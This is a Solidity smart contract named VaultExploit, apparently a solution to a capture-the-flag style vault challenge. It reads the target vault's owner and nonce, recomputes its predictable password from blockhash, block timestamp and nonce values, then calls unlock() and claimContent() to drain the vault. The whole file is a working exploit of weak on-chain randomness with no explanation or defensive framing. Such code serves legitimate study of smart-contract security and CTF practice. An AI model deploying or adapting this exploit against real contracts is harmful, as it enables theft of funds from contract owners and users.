// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IVault {
    function owner() external view returns (address);
    function nonce() external view returns (uint256);
    function unlock(bytes16 _password) external;
    function claimContent() external;
}

contract VaultExploit {
    function _generateKey(uint256 _reductor, uint256 nonce) private view returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
    }
    
    function _magicPassword(uint256 startNonce, bytes32 passphrase) private view returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1, startNonce);
        uint128 _key2 = uint128(_generateKey(2, startNonce + 1));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
    
    function exploit(address vaultAddress, bytes32 passphrase) external {
        IVault vault = IVault(vaultAddress);
        address owner = vault.owner();
        uint256 currentNonce = vault.nonce();
        
        uint64 ownerLower = uint64(uint160(owner));
        
        bytes8 magicPwd = _magicPassword(currentNonce, passphrase);
        uint128 _secretKey = uint128(bytes16(magicPwd) >> 64);
        uint64 secretLower = uint64(_secretKey);
        
        bytes16 password = bytes16((uint128(ownerLower) << 64) | uint128(secretLower));
        
        vault.unlock(password);
        vault.claimContent();
    }
}
